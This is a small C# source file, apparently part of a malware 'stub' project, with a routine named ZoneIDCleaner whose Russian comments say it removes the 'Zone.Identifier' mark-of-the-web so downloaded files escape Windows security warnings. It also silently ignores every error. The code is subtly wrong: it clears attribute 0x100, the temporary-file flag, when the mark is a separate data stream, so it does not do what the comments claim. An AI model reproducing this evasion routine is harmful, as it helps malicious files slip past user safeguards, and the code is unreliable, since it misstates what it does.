using Stub.Help.Native;

namespace Stub.Protection
{
    class ZoneIDCleaner
    {
        public static void RemoveZoneIdentifier(string filePath)
        {
            try
            {
                int existingAttributes = NativeMethods.GetFileAttributes(filePath);
                if ((existingAttributes & 0x100) != 0) // Проверяем наличие атрибута "Zone.Identifier"
                {
                    NativeMethods.SetFileAttributes(filePath, existingAttributes - 0x100); // Удаляем атрибут "Zone.Identifier"
                }
            }
            catch { }
        }
    }
}
